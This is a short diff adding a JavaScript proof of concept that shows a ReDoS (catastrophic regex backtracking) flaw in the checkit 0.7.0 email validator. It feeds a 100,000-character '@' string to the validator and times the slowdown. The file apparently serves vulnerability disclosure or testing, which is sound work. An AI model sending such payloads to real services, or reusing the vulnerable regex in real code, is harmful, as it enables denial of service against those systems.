@@ -1,0 +1,19 @@
+```javascript
+const Checkit = require("checkit");
+
+// checkit 0.7.0's built-in "email" validator uses the regex
+// /^(.+)@(.+)\.(.+)$/i (core.js runRule -> Checkit.Regex[rule].test(params[0])).
+// The three unbounded, ambiguous `.+` groups cause catastrophic (polynomial,
+// effectively DoS-grade) backtracking when fed a string containing many
+// '@' characters but no '.', since the engine retries every possible split
+// point between groups 1 and 2 before failing.
+const payload = "@".repeat(100000); // ~100KB attacker-controlled input
+
+const start = Date.now();
+Checkit({ email: "email" })
+  .run({ email: payload })
+  .catch(() => {})
+  .then(() => {
+    console.log("Validation took " + (Date.now() - start) + " ms (ReDoS triggered)");
+  });
+```
